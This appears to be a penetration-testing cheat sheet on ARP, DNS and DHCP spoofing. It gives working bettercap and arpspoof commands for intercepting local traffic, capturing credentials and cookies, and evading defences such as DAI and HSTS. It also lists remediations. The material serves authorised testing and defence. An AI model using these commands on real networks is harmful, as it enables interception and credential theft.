# ARP / DNS Spoofing — Layer-2 / Resolver MitM

> Inject malicious ARP / DNS answers on a local segment to position as MitM. Authorized testing only. Map: MITRE ATT&CK T1557.002 (ARP Cache Poisoning), T1557.003 (DHCP Spoofing).

## TL;DR
- ARP spoofing makes other hosts on the L2 segment send their traffic to attacker's MAC. Layer-2 only — doesn't cross routers.
- DNS spoofing answers an arbitrary domain → attacker IP. Variants: ARP-spoof + local resolver intercept, malicious DHCP option-006 (DNS server), public-DNS hijack via DNS-over-HTTPS bypass (rare).
- Tools: `bettercap` (Go, modern, modular), `ettercap` (older), `dsniff` (arpspoof), `responder` for LLMNR-class.
- Defence: **DAI** (Dynamic ARP Inspection) + **DHCP Snooping** on switches; static ARP for critical hosts; HTTPS + HSTS to defeat downstream MitM; encrypted DNS (DoH/DoT) for client-side resolver hardening.

## Detection / Discovery

### Confirm L2 reachability + targets
```bash
# Local network discovery
sudo arp-scan -l                       # full subnet ARP sweep on default iface
sudo arp-scan --interface=eth0 --localnet

# Or with nmap
sudo nmap -sn 10.0.0.0/24

# Gateway IP / MAC
ip route show default
arp -n
```

### Confirm what protocols clients use for name resolution
```bash
# Sniff DNS queries; if you see them in cleartext on UDP 53, MitM is feasible.
sudo tcpdump -ni eth0 -c 100 'udp port 53'
```

## Exploitation

### ARP spoofing — bettercap (modern)
```bash
sudo bettercap -iface eth0

# Inside bettercap interactive console:
> net.probe on
> net.show
> set arp.spoof.targets 10.0.0.10, 10.0.0.11    # or leave empty for whole subnet
> arp.spoof on
> net.sniff on                                   # capture creds in cleartext

# HTTP-only MitM module
> set http.proxy.script ./proxy-script.js
> http.proxy on

# Modern bettercap caplets for common attacks
> ticker on
```

### dsniff `arpspoof` (classic)
```bash
# Forwarding must be enabled on attacker host
sudo sysctl -w net.ipv4.ip_forward=1
sudo arpspoof -i eth0 -t 10.0.0.10 10.0.0.1     # tell victim that attacker's MAC is the gateway
sudo arpspoof -i eth0 -t 10.0.0.1  10.0.0.10    # tell gateway victim's MAC is attacker's
# Now traffic flows attacker -> [intercept] -> real destination
```

### DNS spoofing on top of ARP spoof
With traffic flowing through attacker, intercept UDP/53:
```bash
# bettercap dns.spoof module
> set dns.spoof.domains *.target.tld
> set dns.spoof.address 10.0.0.100
> dns.spoof on
```
`ettercap` and `dnschef` do the same. Selectively redirect — only target high-value hostnames (login.target.tld) to avoid breaking everything and alerting the victim.

### DHCP spoofing (works without ARP poison)
Race the legitimate DHCP server's DHCPOFFER. If you win, your DHCPOFFER sets:
- Default gateway = attacker
- DNS server = attacker
- Search domain = attacker-controlled
Tools: `dhcpig`, `pig.py`, manual `scapy` script.

```bash
# bettercap dhcp.spoof
> set dhcp.spoof.options "router=10.0.0.99,dns=10.0.0.99"
> dhcp.spoof on
```

### Captured-credential / cookie use
Once MitM:
- HTTP creds in form posts → directly cleartext.
- HTTPS → sslstrip downgrade (effective only if no HSTS) — modern browsers HSTS-preload most banking / SaaS sites; sslstrip success rate is low in 2025.
- Cookies → session takeover for HTTP-only or post-strip HTTPS pages.

## Bypasses (defender mitigations and adaptation)
- DAI on switches → ARP spoof drops at port. Pivot to a host the attacker controls *on the same switch port* (compromised endpoint).
- HSTS-preload → no sslstrip on big SaaS. Pivot to LLMNR/NBT-NS (see [./llmnr-nbtns-responder.md](./llmnr-nbtns-responder.md)) or to internal hosts without HSTS.
- DNS-over-HTTPS / DNS-over-TLS on clients → MitM-port-53 fails. Pivot to ARP spoof + intercept TCP/443 to DNS-resolver (Cloudflare 1.1.1.1) — TLS bump fails on cert pinning.
- 802.1x port auth → unauthed attacker can't even ARP — out of scope here.

## Defence / Remediation
- **Dynamic ARP Inspection (DAI)** + **DHCP Snooping** on every access switch. DAI validates ARP packets against DHCP-Snooping's IP↔MAC binding table.
- **Static ARP** for critical infrastructure (DCs, mgmt-VLAN gateway).
- **Network segmentation** — separate VLANs for user, server, mgmt; ARP spoof can't cross VLAN.
- **802.1x port authentication** + MAC ACLs on switch ports — only authorised devices can plug into the LAN.
- **HSTS preload** for every web property — blocks sslstrip after first visit.
- **Encrypted DNS** (DoH/DoT) on clients + corporate proxy for DNS egress.
- **HTTPS-only intranet** (yes, even internal apps; use internal CA).
- **Wireshark sensors / Zeek** continuously watching for ARP anomalies (multiple-MAC-for-IP, gratuitous ARP storms).
- **CWE-693 Protection Mechanism Failure** + **CWE-940 Improper Verification of Source of a Communication Channel** map to weak L2 posture.

## Sources
- bettercap: https://www.bettercap.org/
- ettercap: https://www.ettercap-project.org/
- dsniff (arpspoof): https://www.monkey.org/~dugsong/dsniff/
- Cisco — Dynamic ARP Inspection: https://www.cisco.com/c/en/us/td/docs/switches/lan/catalyst3750/software/release/12-2_55_se/configuration/guide/scg3750/swdynarp.html
- IETF RFC 826 (ARP): https://datatracker.ietf.org/doc/html/rfc826
- HackTricks ARP spoofing: https://book.hacktricks.wiki/en/generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.html
- MITRE ATT&CK T1557.002 ARP Cache Poisoning: https://attack.mitre.org/techniques/T1557/002/
- MITRE ATT&CK T1557.003 DHCP Spoofing: https://attack.mitre.org/techniques/T1557/003/
